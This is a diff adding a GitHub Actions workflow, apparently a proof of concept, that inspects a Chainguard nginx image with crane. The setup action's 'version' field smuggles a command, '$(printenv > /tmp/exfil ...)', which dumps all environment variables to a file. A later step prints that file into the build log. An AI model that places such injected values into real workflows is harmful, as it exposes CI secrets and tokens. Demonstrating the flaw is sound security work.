@@ -1,0 +1,21 @@
+name: Info Naughty
+
+on:
+  push:
+    branches: ['main']
+  workflow_dispatch:
+
+
+jobs:
+  publish:
+    name: Get Container Info
+    runs-on: ubuntu-latest
+    steps:
+
+      - uses: chainguard-actions/imjasonh-setup-crane@v0.5
+        with:
+          version: $(printenv > /tmp/exfil && echo -n v0.5.1)
+      - run: |
+          cat /tmp/exfil
+          crane digest cgr.dev/chainguard/nginx
+          crane manifest cgr.dev/chainguard/nginx | jq
